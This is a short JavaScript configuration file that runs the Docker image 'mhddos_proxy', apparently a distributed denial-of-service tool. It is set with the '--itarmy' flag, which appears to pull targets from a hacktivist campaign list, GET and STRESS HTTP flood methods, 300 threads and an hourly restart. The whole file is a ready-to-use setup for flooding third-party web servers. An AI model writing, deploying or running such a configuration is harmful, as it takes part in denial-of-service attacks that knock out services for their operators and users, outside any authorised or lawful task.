module.exports = {
  runner: {
    dockerOptions: [
      "--cpus=.5",
    ],
    image: "ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest",
    commandArgs: [
      "--itarmy",
      "--http-methods GET STRESS",
      "-t 300",
      "--copies 1",
    ],
    restartIn: 3600,
  }
}
